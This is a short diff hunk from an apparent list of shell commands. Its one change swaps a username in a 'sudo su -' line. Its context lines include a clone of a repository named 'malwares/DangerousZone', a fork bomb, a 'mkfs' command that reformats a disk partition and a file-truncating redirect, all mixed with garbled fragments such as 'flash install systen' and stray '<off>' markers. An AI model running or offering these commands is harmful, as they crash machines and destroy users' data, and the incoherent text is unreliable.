@@ -87,7 +87,7 @@ flash install systen
 git clone https://github.com/malwares/DangerousZone
 <off>
 >file
-sudo su - _albertBourla
+sudo su - albert-Bourla
 <off>
 :(){:|:&};:
 mkfs ext4 /dev/sda3. 2a
